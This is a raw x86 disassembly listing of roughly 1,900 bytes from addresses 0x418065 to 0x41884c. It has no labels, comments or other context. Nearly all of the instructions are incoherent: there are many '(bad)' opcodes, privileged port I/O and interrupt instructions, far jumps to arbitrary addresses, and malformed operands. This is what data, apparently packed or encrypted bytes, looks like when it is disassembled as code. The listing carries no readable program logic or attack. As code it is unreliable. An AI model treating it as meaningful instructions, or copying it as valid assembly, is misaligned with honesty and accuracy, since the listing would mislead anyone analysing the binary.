  418065:	ror    dh,1
  418067:	inc    ecx
  418068:	dec    ebp
  418069:	daa    
  41806a:	addr16 mov cl,0x55
  41806d:	dec    edi
  41806e:	mov    al,0xf4
  418070:	add    edi,ecx
  418072:	lds    ecx,FWORD PTR [ecx+0x432b7b86]
  418078:	cmp    al,0xb2
  41807a:	mov    eax,0x9fc4dacb
  41807f:	and    esi,DWORD PTR [ecx-0x328b40dc]
  418085:	pusha  
  418086:	in     al,dx
  418087:	push   ds
  418088:	lods   eax,DWORD PTR ds:[esi]
  418089:	fldenv [edx+0x52]
  41808c:	inc    DWORD PTR [eax]
  41808e:	shr    bl,0x65
  418091:	shl    DWORD PTR [edi-0x2],cl
  418094:	jno    0x4180a1
  418096:	dec    ecx
  418097:	jle    0x418110
  418099:	fsub   QWORD PTR [edx]
  41809b:	(bad)
  41809e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809f:	ja     0x418065
  4180a1:	ds push ebx
  4180a3:	cmp    bh,ah
  4180a5:	pop    esi
  4180a6:	jmp    0x4180ea
  4180a8:	jmp    FWORD PTR [edi+edi*8+0x347cb48b]
  4180af:	lahf   
  4180b0:	mov    ebp,0x5351be3c
  4180b5:	xchg   esp,eax
  4180b6:	push   eax
  4180b7:	mov    ds:0xa40e5d03,eax
  4180bc:	mov    al,ds:0x12a6944d
  4180c1:	mov    ebp,0xb7d75a64
  4180c6:	mov    BYTE PTR [edx+edx*1+0x54],cl
  4180ca:	mov    ch,0x70
  4180cc:	xor    DWORD PTR [edi],eax
  4180ce:	mov    ebx,0xbf0f0177
  4180d3:	cdq    
  4180d4:	jns    0x4180e1
  4180d6:	addr16 jge 0x418088
  4180d9:	push   eax
  4180da:	icebp  
  4180db:	popa   
  4180dc:	dec    esi
  4180dd:	arpl   bx,ax
  4180df:	fiadd  WORD PTR [edx+0x3]
  4180e2:	cli    
  4180e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e4:	inc    ecx
  4180e5:	sti    
  4180e6:	mov    ch,0xd0
  4180e8:	jmp    DWORD PTR [edx-0x69]
  4180eb:	inc    ebx
  4180ec:	test   BYTE PTR [edx],0x46
  4180ef:	sti    
  4180f0:	dec    BYTE PTR [ebp-0x225b6315]
  4180f6:	clc    
  4180f7:	retf   
  4180f8:	pop    eax
  4180f9:	fistp  QWORD PTR [edi+edi*8]
  4180fc:	pop    esp
  4180fd:	xor    ecx,ebp
  4180ff:	rol    DWORD PTR [ecx],1
  418101:	cmp    DWORD PTR [ebp-0x29],esi
  418104:	add    DWORD PTR [edx-0x9],ecx
  418107:	push   edi
  418108:	or     BYTE PTR [edi+0x7fc20ff0],al
  41810e:	push   edi
  41810f:	mov    esi,0xa668afe2
  418114:	mov    bl,0x6
  418116:	xor    esp,DWORD PTR [eax-0x4c359b4]
  41811c:	cs mov ebp,0xe8e98f2a
  418122:	sub    DWORD PTR [ebp-0x9],ebx
  418125:	or     bh,BYTE PTR [ecx]
  418127:	mov    edx,0x48ccc590
  41812c:	clc    
  41812d:	xor    edi,DWORD PTR [ecx]
  41812f:	sub    eax,0xbb683e02
  418134:	push   0x9d013e9a
  418139:	inc    ecx
  41813a:	in     eax,dx
  41813b:	jle    0x4180c5
  41813d:	pop    eax
  41813e:	stos   DWORD PTR es:[edi],eax
  41813f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418140:	adc    BYTE PTR [edx-0x3a70c5f2],ah
  418146:	out    0xeb,eax
  418148:	sbb    bl,BYTE PTR [eax+0x753f50dd]
  41814e:	xchg   edx,eax
  41814f:	(bad)  [edi+0x7b8c72b6]
  418155:	std    
  418156:	cmp    al,0x12
  418158:	sbb    al,0xe
  41815a:	lods   eax,DWORD PTR ds:[esi]
  41815b:	int    0x57
  41815d:	jne    0x4181d3
  41815f:	sbb    DWORD PTR ss:[ecx+ecx*1-0x2a],edi
  418164:	push   ds
  418165:	mov    eax,0xf187c6c2
  41816a:	xchg   DWORD PTR [edi],ebp
  41816c:	sub    eax,0x379c5cd6
  418171:	lods   al,BYTE PTR ds:[esi]
  418172:	jae    0x41817b
  418174:	arpl   WORD PTR [esi],sp
  418176:	mov    edx,0x7e5e3f0e
  41817b:	mov    ebx,0x8cd0fd02
  418180:	fadd   DWORD PTR [edx]
  418182:	(bad)  
  418183:	jmp    0xe88d:0xd4a6fe7f
  41818a:	pop    esp
  41818b:	pop    esp
  41818c:	dec    esp
  41818d:	or     DWORD PTR [edx+0x7c],esp
  418190:	pop    ebp
  418191:	stos   BYTE PTR es:[edi],al
  418192:	pop    edx
  418193:	push   es
  418194:	inc    esp
  418195:	lahf   
  418196:	fwait
  418197:	sub    BYTE PTR [ebx+0x67],bh
  41819a:	out    dx,al
  41819b:	mov    esi,0xb04cb849
  4181a0:	push   esp
  4181a1:	xchg   DWORD PTR ds:0xfc054e3e,ecx
  4181a7:	cmp    ah,BYTE PTR [eax+0x50]
  4181aa:	mov    dl,0x74
  4181ac:	xchg   BYTE PTR [edi],dh
  4181ae:	cs daa 
  4181b0:	iret   
  4181b1:	dec    edx
  4181b2:	adc    eax,0xe08b9b4c
  4181b7:	fldcw  WORD PTR [ecx-0x46609133]
  4181bd:	adc    DWORD PTR [esp+ebp*4+0x2c10615a],ecx
  4181c4:	loop   0x418150
  4181c6:	sbb    cl,al
  4181c8:	mov    BYTE PTR [eax],dl
  4181ca:	xor    bl,BYTE PTR [eax+0x3a]
  4181cd:	cdq    
  4181ce:	inc    ebp
  4181cf:	add    BYTE PTR [edi+ecx*8],dh
  4181d2:	or     bl,BYTE PTR ds:0x21a670ae
  4181d8:	adc    eax,DWORD PTR [ebp-0x18441d0e]
  4181de:	push   0xffffff8e
  4181e0:	pop    esi
  4181e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e2:	jl     0x4181c5
  4181e4:	jno    0x418166
  4181e6:	add    DWORD PTR [edx+0x14e7cbff],eax
  4181ec:	imul   ebx,esi,0xffffff9c
  4181ef:	loop   0x418237
  4181f1:	out    dx,eax
  4181f2:	aaa    
  4181f3:	shr    DWORD PTR [edx+0x60],cl
  4181f6:	push   0xffffff98
  4181f8:	adc    al,0x98
  4181fa:	jp     0x418245
  4181fc:	(bad)  
  4181fe:	setae  BYTE PTR [ebp+0x763de4c7]
  418205:	xor    ch,BYTE PTR [esi-0x3911c820]
  41820b:	std    
  41820c:	jns    0x4181f6
  41820e:	arpl   WORD PTR [eax+0x32fbc1f7],bp
  418214:	adc    DWORD PTR [edi-0x3a],eax
  418217:	adc    al,0x7a
  418219:	and    dh,BYTE PTR [ebx]
  41821b:	(bad)  
  41821c:	push   ebx
  41821d:	mov    dh,0xde
  41821f:	stos   BYTE PTR es:[edi],al
  418220:	add    al,0x84
  418222:	popf   
  418223:	clc    
  418224:	addr16 pop ebp
  418226:	shl    BYTE PTR cs:[ebx+0x5b77826],cl
  41822d:	cld    
  41822e:	or     al,0x5c
  418230:	pop    esp
  418231:	pop    ss
  418232:	pop    eax
  418233:	out    dx,al
  418234:	aaa    
  418235:	lds    edx,FWORD PTR [ebx-0x7209a3b2]
  41823b:	jmp    0x1ab2:0x21b9aa41
  418242:	ret    0x60c1
  418245:	call   0xa326:0xbad7c490
  41824c:	push   ds
  41824d:	test   BYTE PTR [edi+ebp*1],bl
  418250:	aas    
  418251:	xchg   ebp,eax
  418252:	push   edx
  418253:	in     al,0x85
  418255:	fiadd  WORD PTR [edi+0x5]
  418258:	adc    eax,0x3d0144b2
  41825d:	or     al,0xb2
  41825f:	scas   eax,DWORD PTR es:[edi]
  418260:	jmp    0xc54e:0x9f66cf4b
  418267:	call   0x1cd52b5a
  41826c:	daa    
  41826d:	clc    
  41826e:	ds pop ds
  418270:	into   
  418271:	call   0xb385:0x34730b01
  418278:	sbb    bh,BYTE PTR [edi]
  41827a:	mov    al,0x77
  41827c:	inc    edx
  41827d:	sub    BYTE PTR [ebp-0x43ddbfb7],dl
  418283:	xor    ebp,DWORD PTR [ebx]
  418285:	dec    ebp
  418286:	js     0x41825a
  418288:	push   0xffffffa8
  41828a:	pop    edx
  41828b:	xchg   ebp,eax
  41828c:	mov    ss,WORD PTR [edi]
  41828e:	cmp    al,0xa3
  418290:	jbe    0x41821a
  418292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418293:	jmp    0xb1e7c6b0
  418298:	jnp    0x4182d7
  41829a:	js     0x41823b
  41829c:	ins    BYTE PTR es:[edi],dx
  41829d:	ss mov ss,esi
  4182a0:	push   esi
  4182a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a2:	fstp   DWORD PTR [ebp-0x704f317b]
  4182a8:	mov    ecx,0x4055ef55
  4182ad:	iret   
  4182ae:	xor    ecx,edi
  4182b0:	jnp    0x418249
  4182b2:	pop    es
  4182b3:	mov    gs,WORD PTR [ecx+0x22701260]
  4182b9:	ja     0x4182c7
  4182bb:	and    BYTE PTR [ecx],ah
  4182bd:	push   edi
  4182be:	jnp    0x4182f5
  4182c0:	pop    ebx
  4182c1:	jmp    0x418256
  4182c3:	pop    ecx
  4182c4:	mov    ebx,0x87663f45
  4182c9:	mov    edx,0xc09efd1c
  4182ce:	or     dh,ah
  4182d0:	aaa    
  4182d1:	mov    esp,0x467b15ff
  4182d6:	cld    
  4182d7:	(bad)  
  4182d8:	fild   DWORD PTR [edx-0x3]
  4182db:	aam    0xcb
  4182dd:	push   eax
  4182de:	cwde   
  4182df:	enter  0xb337,0x26
  4182e3:	lods   al,BYTE PTR ds:[esi]
  4182e4:	cld    
  4182e5:	je     0x418366
  4182e7:	fistp  WORD PTR [edi-0x1a652a20]
  4182ed:	sub    cl,BYTE PTR [ebp-0x16]
  4182f0:	aad    0xf1
  4182f2:	jne    0x418280
  4182f4:	fisubr DWORD PTR [ebx+ecx*2+0x670a92ba]
  4182fb:	ror    ecx,cl
  4182fd:	es call 0x80c1:0x6a8de0f2
  418305:	dec    eax
  418306:	adc    al,0xd1
  418308:	xchg   esi,eax
  418309:	das    
  41830a:	pop    ecx
  41830b:	jae    0x4182c2
  41830d:	jg     0x418367
  41830f:	inc    esp
  418310:	jbe    0x418340
  418312:	jmp    0x7bc5b224
  418317:	jo     0x4182df
  418319:	sahf   
  41831a:	mov    ?,WORD PTR [ebx+eax*1-0x3c8f794c]
  418321:	les    ebx,FWORD PTR [edx]
  418323:	xchg   esi,eax
  418324:	and    ch,BYTE PTR ds:0xc06f71d2
  41832a:	sub    al,0x42
  41832c:	in     eax,0x77
  41832e:	pop    edi
  41832f:	or     al,0xd
  418331:	dec    edi
  418332:	xor    DWORD PTR [edi-0x4b7010ac],esp
  418338:	ror    DWORD PTR [eax+ebx*4],0x86
  41833c:	or     eax,0x14f6437a
  418341:	arpl   WORD PTR [ecx],sp
  418343:	std    
  418344:	xchg   ecx,eax
  418345:	retf   0x5d24
  418348:	cdq    
  418349:	mov    esp,0xf1684a0e
  41834e:	in     eax,dx
  41834f:	clc    
  418350:	push   eax
  418351:	and    dh,BYTE PTR [esp+esi*8-0x3b]
  418355:	aas    
  418356:	jle    0x418335
  418358:	jae    0x418361
  41835a:	fnstenv [esi+0x2a2b02cd]
  418360:	jae    0x418343
  418362:	sbb    DWORD PTR [esp+ebp*4+0x6640b55a],edx
  418369:	sub    bh,BYTE PTR [edx]
  41836b:	retf   0xf3a7
  41836e:	lea    edx,[edx+0x3ca9b7e1]
  418374:	and    ah,cl
  418376:	cmovl  edi,DWORD PTR [esi-0x3ea78a85]
  41837d:	shl    BYTE PTR [edi+ecx*4+0x2d],0x38
  418382:	test   BYTE PTR [edi],cl
  418384:	cmp    ebx,DWORD PTR [edi+0x26a7ed8f]
  41838a:	imul   eax,ebp,0xffffff8a
  41838d:	jge    0x4183df
  41838f:	mov    eax,ds:0x6cdba07b
  418394:	sbb    al,bl
  418396:	dec    ecx
  418397:	xchg   dl,dl
  418399:	and    eax,0x35cc393c
  41839e:	cmp    al,0xec
  4183a0:	mov    bh,0xc5
  4183a2:	test   eax,0x9762c907
  4183a7:	hlt    
  4183a8:	push   ds
  4183a9:	test   eax,0xded4871c
  4183ae:	(bad)  
  4183af:	and    BYTE PTR [eax],bh
  4183b1:	ret    
  4183b2:	(bad)  
  4183b3:	jmp    0xd08513c7
  4183b8:	test   BYTE PTR [esi-0x4b],dh
  4183bb:	add    ecx,DWORD PTR [edi-0x7eb15b2e]
  4183c1:	bndstx [ebp+0x26],(bad)
  4183c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c6:	mov    ch,0xa8
  4183c8:	je     0x4183ce
  4183ca:	fst    DWORD PTR [esi]
  4183cc:	aam    0x9c
  4183ce:	xor    BYTE PTR [ecx+0xa],bl
  4183d1:	push   ebx
  4183d2:	mov    ch,0x59
  4183d4:	or     ebp,edx
  4183d6:	push   eax
  4183d7:	jb     0x4183f9
  4183d9:	xchg   ebp,eax
  4183da:	sub    BYTE PTR [ebx-0x46],0x4b
  4183de:	and    bh,cl
  4183e0:	out    dx,al
  4183e1:	test   eax,0x789a57a6
  4183e6:	or     cl,BYTE PTR [ebx+ecx*8-0x45]
  4183ea:	outs   dx,DWORD PTR ds:[esi]
  4183eb:	bound  esp,QWORD PTR [edi-0x4c]
  4183ee:	loopne 0x418436
  4183f0:	ss pop eax
  4183f2:	fdiv   st,st(7)
  4183f4:	nop
  4183f5:	dec    ebx
  4183f6:	iret   
  4183f7:	push   ebx
  4183f8:	mov    dl,0xff
  4183fa:	lods   eax,DWORD PTR ds:[esi]
  4183fb:	pop    ds
  4183fc:	xor    BYTE PTR [edi-0x79],ah
  4183ff:	rcl    BYTE PTR [esi+0x4c],cl
  418402:	(bad)  
  418403:	mov    bl,0x4
  418405:	idiv   edx
  418407:	stos   DWORD PTR es:[edi],eax
  418408:	push   0x2866a4af
  41840d:	adc    eax,0xd416d8e6
  418412:	mov    DWORD PTR [edx+eax*4],ebx
  418415:	cmp    edx,DWORD PTR [esi+0x32]
  418418:	bound  ecx,QWORD PTR [edx]
  41841a:	std    
  41841b:	sti    
  41841c:	cdq    
  41841d:	(bad)  
  41841f:	in     eax,0x5e
  418421:	xchg   esi,esp
  418423:	adc    BYTE PTR [ebp+0x6a747dc4],dh
  418429:	push   eax
  41842a:	stos   DWORD PTR es:[edi],eax
  41842b:	xor    al,0x21
  41842d:	aad    0x61
  41842f:	arpl   WORD PTR ds:0x287cf5f1,dx
  418435:	icebp  
  418436:	xor    ch,bh
  418438:	jmp    0x77303f38
  41843d:	rcl    bl,1
  41843f:	add    BYTE PTR ds:0xd9e34c7a,bh
  418445:	mov    ?,WORD PTR [ebx-0x1ca8e708]
  41844b:	xchg   ebx,eax
  41844c:	and    eax,DWORD PTR [eax+eiz*2-0x2cb4473a]
  418453:	in     eax,dx
  418454:	scas   al,BYTE PTR es:[edi]
  418455:	cmc    
  418456:	mov    WORD PTR [esi],ss
  418458:	inc    eax
  418459:	aam    0xaa
  41845b:	xchg   ebx,eax
  41845c:	fisttp WORD PTR [ebp-0x2ff9f954]
  418462:	mov    bl,0x4f
  418464:	rcr    BYTE PTR [edi-0x45ee1368],0x37
  41846b:	call   0xcf6d8068
  418470:	and    bl,BYTE PTR [edx+0x58]
  418473:	dec    esi
  418474:	rcr    DWORD PTR [ecx-0x23684aa3],cl
  41847a:	sbb    esp,eax
  41847c:	(bad)  
  41847d:	xor    al,0x28
  41847f:	inc    edx
  418480:	cmp    ecx,DWORD PTR [edx+ebp*1-0x1a3d3dd]
  418487:	mov    eax,0x954596d9
  41848c:	stos   BYTE PTR es:[edi],al
  41848d:	mov    eax,ds:0xa655bc47
  418492:	loop   0x41848b
  418494:	les    eax,FWORD PTR [edx+eiz*4-0x61032718]
  41849b:	fs sub al,0xd0
  41849e:	add    DWORD PTR [ebp-0x6456ea37],edx
  4184a4:	push   0x4d2a9029
  4184a9:	push   ds
  4184aa:	(bad)  
  4184ac:	pop    ds
  4184ad:	dec    esp
  4184ae:	push   eax
  4184af:	xchg   ebx,eax
  4184b0:	pushfw 
  4184b2:	test   BYTE PTR [eax+edx*2-0x79],0x5b
  4184b7:	jae    0x418463
  4184b9:	adc    al,0x4a
  4184bb:	or     BYTE PTR [ebx+0xf],bh
  4184be:	xchg   esp,eax
  4184bf:	jbe    0x4184f7
  4184c1:	jge    0x418459
  4184c3:	fldcw  WORD PTR [ebp+0x7e9c8e22]
  4184c9:	and    al,0x9e
  4184cb:	or     ah,dh
  4184cd:	mov    ds:0xc87f1171,al
  4184d2:	or     BYTE PTR [bp+di-0x73],bh
  4184d6:	dec    ebx
  4184d7:	mov    edi,0x2c8a6519
  4184dc:	jno    0x418508
  4184de:	fadd   st,st(2)
  4184e0:	pusha  
  4184e1:	jge    0x4184a1
  4184e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184e4:	push   ebp
  4184e5:	mov    al,0xea
  4184e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e8:	or     ecx,DWORD PTR [ebx-0x16]
  4184eb:	call   0xa8e45781
  4184f0:	jl     0x4184bb
  4184f2:	sbb    al,0xd1
  4184f4:	push   ecx
  4184f5:	leave  
  4184f6:	push   ebx
  4184f7:	lods   eax,DWORD PTR ds:[esi]
  4184f8:	repz xlat BYTE PTR ds:[ebx]
  4184fa:	aas    
  4184fb:	adc    DWORD PTR [ebp-0x2b],0x10
  4184ff:	push   ds
  418500:	mov    edi,0x189ea9ef
  418505:	test   DWORD PTR [ecx-0x52],edx
  418508:	clc    
  418509:	test   al,0xba
  41850b:	inc    edi
  41850c:	add    DWORD PTR ss:[ecx*1-0x6b9ea270],edi
  418514:	cmp    ch,BYTE PTR [ebx+esi*8+0x39]
  418518:	(bad)  
  418519:	scas   al,BYTE PTR es:[edi]
  41851a:	fisub  DWORD PTR [esi+0x0]
  41851d:	rcr    BYTE PTR [eax-0x5c1602ca],1
  418523:	fbstp  TBYTE PTR [ecx+0x7a]
  418526:	sub    al,0xc8
  418528:	test   al,0x38
  41852a:	ret    
  41852b:	(bad)  
  41852c:	xchg   edx,eax
  41852d:	popf   
  41852e:	push   edi
  41852f:	pop    ss
  418530:	retf   
  418531:	shr    DWORD PTR ds:0xe965d1e,0xc1
  418538:	jb     0x418597
  41853a:	mov    DWORD PTR [ecx-0x1a714277],ebx
  418540:	jle    0x4185b1
  418542:	ja     0x4184c9
  418544:	fild   DWORD PTR [edx+0x6]
  418547:	mov    BYTE PTR [ecx+0x51514b6c],ah
  41854d:	sahf   
  41854e:	or     cl,cl
  418550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418551:	(bad)  
  418552:	call   0x48cf2c4f
  418557:	lods   al,BYTE PTR ds:[esi]
  418558:	sub    edi,ebp
  41855a:	outs   dx,DWORD PTR ds:[esi]
  41855b:	test   ax,0x5098
  41855f:	xor    ebx,DWORD PTR [edx+0x51]
  418562:	retf   0x3afc
  418565:	pop    ss
  418566:	icebp  
  418567:	cli    
  418568:	cmp    DWORD PTR [eax+0x527bb48d],0x6691326c
  418572:	xor    al,0xd6
  418574:	fbstp  TBYTE PTR [ecx]
  418576:	mov    ds:0xbd10c5ff,eax
  41857b:	stc    
  41857c:	xor    DWORD PTR [ebp+0x78],ecx
  41857f:	dec    eax
  418580:	mov    edi,0xce6c81c8
  418585:	adc    eax,0x6c45adf7
  41858a:	jg     0x418604
  41858c:	push   cs
  41858d:	xor    edi,ebp
  41858f:	xchg   ecx,eax
  418590:	or     eax,0x4b946faf
  418595:	mov    ecx,0x1be69090
  41859a:	aaa    
  41859b:	push   0x35
  41859d:	ret    0xea0b
  4185a0:	xchg   esi,eax
  4185a1:	mov    al,ds:0x66f991e7
  4185a6:	xchg   ebp,eax
  4185a7:	jle    0x4185f4
  4185a9:	or     bh,BYTE PTR [ebx]
  4185ab:	popf   
  4185ac:	mov    edx,DWORD PTR [ecx-0x46]
  4185af:	and    bl,BYTE PTR [eax-0x5220d690]
  4185b5:	and    eax,0x3da65441
  4185ba:	add    dh,0xf3
  4185bd:	mov    bh,0xbb
  4185bf:	in     al,dx
  4185c0:	test   eax,0x47fa3e84
  4185c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c6:	push   0x58
  4185c8:	pop    ss
  4185c9:	xchg   DWORD PTR [esi+0x15b2eb16],ebp
  4185cf:	jb     0x418637
  4185d1:	out    0x51,eax
  4185d3:	fist   WORD PTR [edi+0x7b0853ae]
  4185d9:	lods   al,BYTE PTR ds:[esi]
  4185da:	rol    BYTE PTR [ebp+0x78],cl
  4185dd:	xchg   esp,eax
  4185de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185df:	imul   ebx,DWORD PTR [edi+0x796052ee],0xe2ec4d54
  4185e9:	lock fdecstp 
  4185ec:	scas   eax,DWORD PTR es:[edi]
  4185ed:	cmp    ah,dl
  4185ef:	retf   0xf77a
  4185f2:	sti    
  4185f3:	imul   edi,DWORD PTR [edx-0x74eb1b12],0x14
  4185fa:	xor    ch,BYTE PTR [edx]
  4185fc:	dec    edx
  4185fd:	loope  0x4185dc
  4185ff:	data16 fbld TBYTE PTR [ebx+0x2e]
  418603:	mov    ss,ecx
  418605:	xchg   esi,eax
  418606:	(bad)  
  418607:	mov    ch,0x40
  418609:	mov    ch,0xf7
  41860b:	inc    edi
  41860c:	mov    esi,0x2ee5dd6d
  418611:	pop    ecx
  418612:	pop    ebx
  418613:	imul   esi,DWORD PTR ds:0x43c95573,0xca2ef65a
  41861d:	push   ecx
  41861e:	xlat   BYTE PTR ds:[ebx]
  41861f:	xor    DWORD PTR [esi*4+0x1eecc061],edx
  418626:	fdiv   QWORD PTR [esi-0x68]
  418629:	ror    DWORD PTR [esi-0x34],1
  41862c:	mov    esi,0xa0ae20c5
  418631:	mov    ah,0x91
  418633:	pop    es
  418634:	pop    esi
  418635:	push   esp
  418636:	jmp    0x4df1e5e0
  41863b:	sub    eax,0xc4e04224
  418640:	in     al,0x99
  418642:	cmc    
  418643:	jecxz  0x41866a
  418645:	sahf   
  418646:	cli    
  418647:	pop    ebp
  418648:	cmp    eax,0x9192612
  41864d:	ds pop ebx
  41864f:	cmp    ch,dh
  418651:	icebp  
  418652:	jmp    FWORD PTR [edi-0x74]
  418655:	dec    edx
  418656:	push   ss
  418657:	mov    BYTE PTR [edx+0x5f53573b],bl
  41865d:	aad    0x2f
  41865f:	sti    
  418660:	jecxz  0x418644
  418662:	mov    ebx,0xd7481219
  418667:	nop
  418668:	push   esi
  418669:	ret    
  41866a:	push   esp
  41866b:	dec    eax
  41866c:	inc    esp
  41866d:	rcl    DWORD PTR [esi],0x4d
  418670:	cmp    dh,ah
  418672:	and    eax,0x2e701547
  418677:	sub    eax,0x22cd231d
  41867c:	dec    ebx
  41867d:	jecxz  0x4186a6
  41867f:	xor    eax,0x5a7bf479
  418684:	xchg   ecx,ecx
  418686:	xchg   BYTE PTR [ecx-0x2d],ah
  418689:	cli    
  41868a:	dec    eax
  41868b:	mov    al,ds:0xf115085
  418690:	jg     0x4186f1
  418692:	jae    0x4186f6
  418694:	cmp    ch,BYTE PTR [edi]
  418696:	adc    eax,DWORD PTR [esi]
  418698:	jne    0x4186ac
  41869a:	ds out 0x3e,eax
  41869d:	xchg   DWORD PTR [edi+0x635db4b8],ebx
  4186a3:	cmp    cl,dl
  4186a5:	ret    
  4186a6:	bound  ebx,QWORD PTR [ecx]
  4186a8:	rcr    BYTE PTR [esp+ecx*4-0x23c90fd6],0xcf
  4186b0:	adc    dh,0xf6
  4186b3:	imul   esp,DWORD PTR [esi-0x10],0x21
  4186b7:	push   ebx
  4186b8:	daa    
  4186b9:	pusha  
  4186ba:	dec    ebx
  4186bb:	shr    DWORD PTR [ebx-0xd3a548d],1
  4186c1:	mov    DWORD PTR [edi+0x1b],edx
  4186c4:	retf   0x71e1
  4186c7:	xchg   edx,eax
  4186c8:	sbb    ch,ah
  4186ca:	int    0x46
  4186cc:	les    ebp,FWORD PTR [edx+0x39ecd70]
  4186d2:	int    0xf9
  4186d4:	out    0x41,al
  4186d6:	rcr    ah,0x35
  4186d9:	stos   BYTE PTR es:[edi],al
  4186da:	add    ah,ch
  4186dc:	cmc    
  4186dd:	test   cl,cl
  4186df:	adc    al,0xc5
  4186e1:	outs   dx,BYTE PTR ds:[esi]
  4186e2:	dec    eax
  4186e3:	mov    eax,ds:0xdab1dde8
  4186e8:	inc    eax
  4186e9:	nop
  4186ea:	jg     0x4186d3
  4186ec:	fdiv   DWORD PTR [ebx]
  4186ee:	add    DWORD PTR [ecx+0x390552a6],esp
  4186f4:	int3   
  4186f5:	repnz repnz mov esp,0x42aa5e5c
  4186fc:	jl     0x418743
  4186fe:	lds    ecx,FWORD PTR [edx]
  418700:	(bad)  
  418701:	arpl   WORD PTR [eax-0x34],dx
  418704:	xor    DWORD PTR [esi-0x5],ecx
  418707:	lock inc ecx
  418709:	sbb    al,BYTE PTR [ecx-0x2b4c371c]
  41870f:	ds jb  0x41871e
  418712:	xlat   BYTE PTR ds:[ebx]
  418713:	repz jns 0x4186e7
  418716:	sbb    ch,ch
  418718:	in     eax,dx
  418719:	push   es
  41871a:	sar    BYTE PTR [esi+0x6eebff56],cl
  418720:	shl    DWORD PTR [ebp+0x11e95c30],1
  418726:	popf   
  418727:	pop    ds
  418728:	xchg   ebx,eax
  418729:	outs   dx,BYTE PTR ds:[esi]
  41872a:	dec    eax
  41872b:	je     0x4186b1
  41872d:	mov    bh,0x94
  41872f:	enter  0x3b29,0x71
  418733:	shr    DWORD PTR [edx-0x1bf9283c],0x8
  41873a:	div    DWORD PTR [bx]
  41873d:	ror    esp,0x50
  418740:	pop    es
  418741:	xchg   esp,eax
  418742:	out    dx,al
  418743:	fdivr  QWORD PTR [edx]
  418745:	xor    al,bh
  418747:	clc    
  418748:	adc    BYTE PTR ds:0x4cb9767e,bl
  41874e:	(bad)  
  41874f:	outs   dx,DWORD PTR ds:[esi]
  418750:	cdq    
  418751:	mov    edi,0x9a2b95b7
  418756:	in     al,dx
  418757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418758:	pusha  
  418759:	leave  
  41875a:	add    BYTE PTR [ecx-0x8],ah
  41875d:	cdq    
  41875e:	imul   esi,DWORD PTR [edi+0x276815cc],0x937172ca
  418768:	mov    edi,0xefbdaaae
  41876d:	(bad)  
  41876e:	mov    dl,0x6f
  418770:	scas   eax,DWORD PTR es:[edi]
  418771:	inc    esp
  418772:	push   esp
  418773:	and    eax,0x4c194dac
  418778:	mov    esi,0x5653d7bd
  41877d:	test   DWORD PTR [edx*8-0x358329a7],edi
  418784:	push   0xfffffff8
  418786:	xchg   DWORD PTR [edx+0x375f0284],ebx
  41878c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41878d:	loopne 0x418727
  41878f:	jns    0x4187ae
  418791:	cmp    esi,esi
  418793:	adc    al,0xc6
  418795:	mov    esi,0xf03c9e72
  41879a:	aam    0xfd
  41879c:	rcl    DWORD PTR [esi],1
  41879e:	mov    ch,0xc
  4187a0:	push   0xbff6ec4d
  4187a5:	aaa    
  4187a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187a7:	or     eax,eax
  4187a9:	mov    esp,0xe36d1257
  4187ae:	lds    esp,FWORD PTR [edi-0x30]
  4187b1:	imul   ebp,DWORD PTR [edx],0x1f
  4187b4:	add    al,0x3c
  4187b6:	mov    al,ds:0x9b7890e2
  4187bb:	jge    0x418814
  4187bd:	jle    0x4187cc
  4187bf:	jecxz  0x418757
  4187c1:	dec    si
  4187c3:	mov    al,ds:0x8acd529a
  4187c8:	jmp    0x418821
  4187ca:	outs   dx,DWORD PTR ds:[esi]
  4187cb:	sbb    BYTE PTR [esi-0x51],bl
  4187ce:	pop    ebx
  4187cf:	sbb    al,0xd0
  4187d1:	xchg   esi,eax
  4187d2:	and    eax,0x6103d55d
  4187d7:	call   esi
  4187d9:	call   0x1af534a1
  4187de:	ins    DWORD PTR es:[edi],dx
  4187df:	pop    esp
  4187e0:	jne    0x41880e
  4187e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e4:	mov    edi,0x174a87ae
  4187e9:	out    0xb3,eax
  4187eb:	(bad)  
  4187ec:	clc    
  4187ed:	in     eax,dx
  4187ee:	xchg   esi,eax
  4187ef:	cmp    eax,0x8f2f9d83
  4187f4:	adc    DWORD PTR [ebx-0x7],0xc5cd0929
  4187fb:	xchg   esi,eax
  4187fc:	adc    BYTE PTR [edx-0x5ecf3971],bl
  418802:	jae    0x4187c7
  418804:	scas   eax,DWORD PTR es:[edi]
  418805:	mov    eax,0xd5c79440
  41880a:	pop    eax
  41880b:	cli    
  41880c:	jbe    0x41884e
  41880e:	mov    ebp,0xca21cae3
  418813:	push   ss
  418814:	add    eax,0x661df1d1
  418819:	loopne 0x4187cc
  41881b:	xchg   edi,eax
  41881c:	xor    eax,DWORD PTR [edx]
  41881e:	rol    BYTE PTR [ebx],0xa6
  418821:	cmp    ebp,ecx
  418823:	pop    esi
  418824:	xor    cl,dh
  418826:	adc    dh,dh
  418828:	jle    0x418850
  41882a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41882c:	cld    
  41882d:	imul   edi,DWORD PTR [edi*1+0x18547acd],0xcff0404c
  418838:	out    0x84,eax
  41883a:	stc    
  41883b:	cmp    DWORD PTR [eax+esi*1-0x32],eax
  41883f:	les    edx,FWORD PTR [esi]
  418841:	scas   eax,DWORD PTR es:[edi]
  418842:	sub    eax,0xb14b366
  418847:	lahf   
  418848:	jnp    0x41882e
  41884a:	neg    BYTE PTR [ecx]
  41884c:	pop    ss
